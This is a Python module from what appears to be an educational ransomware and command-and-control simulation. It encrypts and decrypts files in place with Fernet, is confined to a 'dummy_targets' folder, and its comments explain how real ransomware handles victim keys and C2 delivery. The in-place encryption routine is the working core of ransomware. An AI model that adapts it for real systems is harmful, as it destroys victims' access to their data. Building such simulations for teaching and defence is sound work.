"""
crypto_manager.py — Fernet symmetric encryption module for the C2 simulation.

Demonstrates how ransomware encrypts victim files using symmetric encryption.
The CryptoManager class wraps the cryptography library's Fernet implementation,
which uses AES-128-CBC under the hood with HMAC-SHA256 for authentication.

SAFETY RESTRICTION:
    Encryption and decryption are restricted to the 'dummy_targets/' directory
    inside the project folder. This class will refuse to operate on any path
    outside that directory.

Key concept for the writeup:
    Real ransomware generates a random key per victim, encrypts it with the
    attacker's RSA public key, and sends it to a C2 server. The victim never
    sees the key. Here we use a static key for simulation purposes only.
"""

import os
from cryptography.fernet import Fernet, InvalidToken


# The directory this module is allowed to touch. Any path outside is rejected.
ALLOWED_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "dummy_targets")


class CryptoManager:
    """
    Manages symmetric file encryption/decryption for the ransomware simulation.

    Uses Fernet (AES-128-CBC + HMAC-SHA256) from the `cryptography` library.
    Fernet guarantees that an encrypted message cannot be read or tampered with
    without the key — which is what makes ransomware so effective in the real world.

    Attributes:
        _key (bytes): The Fernet encryption key.
        _fernet (Fernet): The initialized Fernet cipher object.
        _allowed_dir (str): The only directory this instance may touch.
    """

    def __init__(self, key: bytes = None):
        """
        Initialize the CryptoManager with a given key, or generate a new one.

        Args:
            key: A valid Fernet key (32 url-safe base64-encoded bytes).
                 If None, a new random key is generated.
        """
        if key is None:
            self._key = Fernet.generate_key()
        else:
            self._key = key

        self._fernet = Fernet(self._key)
        self._allowed_dir = ALLOWED_DIR

        # Ensure the safe target directory exists
        os.makedirs(self._allowed_dir, exist_ok=True)

    @property
    def key(self) -> bytes:
        """Return the encryption key (would normally be sent to C2 server)."""
        return self._key

    def _is_safe_path(self, path: str) -> bool:
        """
        Validate that a path is inside the allowed directory.

        This uses os.path.realpath to resolve symlinks and prevent
        path traversal attacks (e.g., '../../etc/passwd').

        Args:
            path: The filesystem path to validate.

        Returns:
            True only if path is inside ALLOWED_DIR.
        """
        real_path = os.path.realpath(path)
        real_allowed = os.path.realpath(self._allowed_dir)
        return real_path.startswith(real_allowed + os.sep) or real_path == real_allowed

    def encrypt_directory(self) -> list[dict]:
        """
        Encrypt all files in the allowed dummy_targets directory.

        Walks the directory tree, encrypts each file in-place, and returns
        a list of result records.

        Returns:
            A list of dicts: [{"file": str, "status": "encrypted"|"skipped"|"error"}]
        """
        results = []

        for root, _dirs, files in os.walk(self._allowed_dir):
            for filename in files:
                filepath = os.path.join(root, filename)

                if not self._is_safe_path(filepath):
                    results.append({"file": filename, "status": "blocked (unsafe path)"})
                    continue

                raw = _read_file(filepath)
                if raw is None:
                    results.append({"file": filename, "status": "error (read failed)"})
                    continue

                # Skip files that are already Fernet-encrypted
                # (Fernet tokens start with the version byte 0x80)
                if raw[:1] == b"\x80":
                    results.append({"file": filename, "status": "skipped (already encrypted)"})
                    continue

                encrypted = self._fernet.encrypt(raw)
                if _write_file(filepath, encrypted):
                    results.append({"file": filename, "status": "encrypted"})
                else:
                    results.append({"file": filename, "status": "error (write failed)"})

        return results

    def decrypt_directory(self) -> list[dict]:
        """
        Decrypt all Fernet-encrypted files in the allowed dummy_targets directory.

        This simulates 'key delivery' after ransom payment — the victim sends
        payment, the attacker sends the key, and the victim runs decryption.

        Returns:
            A list of dicts: [{"file": str, "status": "decrypted"|"skipped"|"error"}]
        """
        results = []

        for root, _dirs, files in os.walk(self._allowed_dir):
            for filename in files:
                filepath = os.path.join(root, filename)

                if not self._is_safe_path(filepath):
                    results.append({"file": filename, "status": "blocked (unsafe path)"})
                    continue

                raw = _read_file(filepath)
                if raw is None:
                    results.append({"file": filename, "status": "error (read failed)"})
                    continue

                try:
                    decrypted = self._fernet.decrypt(raw)
                    if _write_file(filepath, decrypted):
                        results.append({"file": filename, "status": "decrypted"})
                    else:
                        results.append({"file": filename, "status": "error (write failed)"})
                except InvalidToken:
                    # File is not encrypted with our key, or is not encrypted at all
                    results.append({"file": filename, "status": "skipped (not encrypted / wrong key)"})

        return results


# ── Module-level helpers (private) ──────────────────────────────────────────

def _read_file(path: str) -> bytes | None:
    try:
        with open(path, "rb") as f:
            return f.read()
    except (OSError, IOError):
        return None


def _write_file(path: str, data: bytes) -> bool:
    try:
        with open(path, "wb") as f:
            f.write(data)
        return True
    except (OSError, IOError):
        return False
